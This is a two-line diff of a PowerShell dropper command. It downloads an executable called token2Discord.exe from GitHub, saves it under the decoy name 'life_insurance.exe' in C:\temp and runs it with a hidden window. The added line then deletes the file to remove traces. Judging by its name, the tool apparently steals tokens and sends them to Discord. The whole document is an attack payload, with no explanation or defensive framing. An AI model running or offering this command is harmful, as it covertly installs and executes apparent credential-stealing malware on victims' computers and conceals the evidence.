@@ -1,1 +1,2 @@
 mkdir C:\temp; cd C:\temp; $down = New-Object System.Net.WebClient; $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath C:\temp\life_insurance.exe -WindowStyle Hidden;
+rm C:\temp\life_insurance.exe
